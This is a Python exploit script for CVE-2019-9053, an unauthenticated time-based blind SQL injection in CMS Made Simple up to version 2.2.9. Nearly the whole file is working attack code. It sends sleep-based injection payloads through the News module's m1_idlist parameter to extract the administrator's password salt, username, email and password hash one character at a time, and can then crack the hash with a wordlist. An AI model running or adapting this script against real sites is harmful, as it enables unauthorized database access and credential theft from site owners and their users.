#!/usr/bin/env python3
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import argparse
import hashlib

# Argument parser setup
parser = argparse.ArgumentParser(description="SQL Injection Exploit for CMS Made Simple <= 2.2.9")
parser.add_argument('-u', '--url', type=str, required=True, help="Base target URI (ex. http://10.10.10.100/cms)")
parser.add_argument('-w', '--wordlist', type=str, help="Wordlist for cracking admin password")
parser.add_argument('-c', '--crack', action='store_true', help="Crack password with wordlist", default=False)

args = parser.parse_args()
url_vuln = args.url + '/moduleinterface.php?mact=News,m1_,default,0'

# Initialize variables
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""
salt = ''
wordlist = args.wordlist if args.wordlist else ""

def crack_password():
    global password
    global output
    global wordlist
    with open(wordlist, 'r') as dict_file:
        for line in dict_file:
            line = line.strip()
            beautify_print_try(line)
            if hashlib.md5((salt + line).encode()).hexdigest() == password:
                output += f"\n[+] Password cracked: {line}"
                break

def beautify_print_try(value):
    global output
    print("\033c", end="")  # Clear the console
    cprint(output, 'green', attrs=['bold'])
    cprint(f'[*] Try: {value}', 'red', attrs=['bold'])

def beautify_print():
    global output
    print("\033c", end="")  # Clear the console
    cprint(output, 'green', attrs=['bold'])

def dump_salt():
    global flag, salt, output
    ord_salt = ""
    while flag:
        flag = False
        for char in dictionary:
            temp_salt = salt + char
            ord_salt_temp = ord_salt + hex(ord(char))[2:]
            beautify_print_try(temp_salt)
            payload = f"a,b,1,5))+and+(select+sleep({TIME})+from+cms_siteprefs+where+sitepref_value+like+0x{ord_salt_temp}25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += f'\n[+] Salt for password found: {salt}'

def dump_password():
    global flag, password, output
    ord_password = ""
    while flag:
        flag = False
        for char in dictionary:
            temp_password = password + char
            ord_password_temp = ord_password + hex(ord(char))[2:]
            beautify_print_try(temp_password)
            payload = f"a,b,1,5))+and+(select+sleep({TIME})+from+cms_users"
            payload += f"+where+password+like+0x{ord_password_temp}25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += f'\n[+] Password found: {password}'

def dump_username():
    global flag, db_name, output
    ord_db_name = ""
    while flag:
        flag = False
        for char in dictionary:
            temp_db_name = db_name + char
            ord_db_name_temp = ord_db_name + hex(ord(char))[2:]
            beautify_print_try(temp_db_name)
            payload = f"a,b,1,5))+and+(select+sleep({TIME})+from+cms_users+where+username+like+0x{ord_db_name_temp}25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += f'\n[+] Username found: {db_name}'
    flag = True

def dump_email():
    global flag, email, output
    ord_email = ""
    while flag:
        flag = False
        for char in dictionary:
            temp_email = email + char
            ord_email_temp = ord_email + hex(ord(char))[2:]
            beautify_print_try(temp_email)
            payload = f"a,b,1,5))+and+(select+sleep({TIME})+from+cms_users+where+email+like+0x{ord_email_temp}25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += f'\n[+] Email found: {email}'
    flag = True

# Main script execution
dump_salt()
dump_username()
dump_email()
dump_password()

if args.crack:
    print(colored("[*] Now try to crack password", 'blue'))
    crack_password()

beautify_print()
